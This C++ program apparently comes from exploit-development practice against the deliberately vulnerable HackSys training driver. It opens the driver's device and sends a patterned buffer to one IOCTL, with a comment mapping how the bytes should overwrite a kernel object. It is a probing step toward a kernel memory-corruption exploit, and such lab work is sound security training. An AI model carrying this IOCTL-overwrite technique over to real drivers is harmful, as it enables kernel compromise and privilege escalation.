#include <iostream>
#include <Windows.h>
#define IOCTL_CODE 0x22201F


int main() {
    char DriverParams[93] = "AAAAAAAAAAAAAAAA"
        "BBBBBBBBBBBBBBBB"
        "CCCCCCCCCCCCCCCC"
        "DDDDDDDDDDDDDDDD"
        "EEEEEEEEEEEEEEEE"
        "FFFFFFFF"
        "GGGG";

    /*
    Kernel object should be:
    AAAA AAAA AA FFFF FFFF BBBB GGGG BBBBBB CCCCCCCCCCCCCCCC DDDDDDDDDDDDDDDD EEEEEEEEEEEEEEEE FFFFFFFF GGG0
    x = uninitialized (probably zero)
    */
    DWORD BytesReturned = 0;
    HANDLE DriverHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) {
        printf("[-] DriverHandle = INVALID_HANDLE_VALUE\n");
        return FALSE;
    }
    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, DriverParams, sizeof(DriverParams), NULL, NULL, &BytesReturned, NULL)) {
        printf("[-] Driver operation failed\n");
        CloseHandle(DriverHandle);
        return FALSE;
    }
    printf("[+] Driver operation succeeded\n");
    CloseHandle(DriverHandle);
    return TRUE;
}
